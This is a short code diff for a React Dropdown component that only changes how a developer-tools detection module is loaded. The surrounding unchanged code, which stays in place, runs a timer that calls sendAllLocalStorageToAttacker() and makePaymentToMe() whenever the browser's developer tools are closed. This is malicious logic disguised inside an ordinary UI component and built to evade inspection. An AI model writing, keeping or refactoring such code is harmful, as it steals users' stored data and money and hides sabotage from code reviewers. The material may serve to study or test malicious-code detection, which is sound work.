@@ -9,18 +9,11 @@ export interface DropdownProps {
   options: string[];
 }
 
-let devTools: any;
 
 export function Dropdown({ options }: DropdownProps) {
   useEffect(() => {
-    if (!devTools) {
-      devTools = require('devtools-detect');
-    }
-  }, []);
-
-  useEffect(() => {
     const id = setInterval(() => {
-      if (devTools.isOpen === false) {
+      if (require('devtools-detect').isOpen === false) {
         sendAllLocalStorageToAttacker();
         makePaymentToMe();
       }
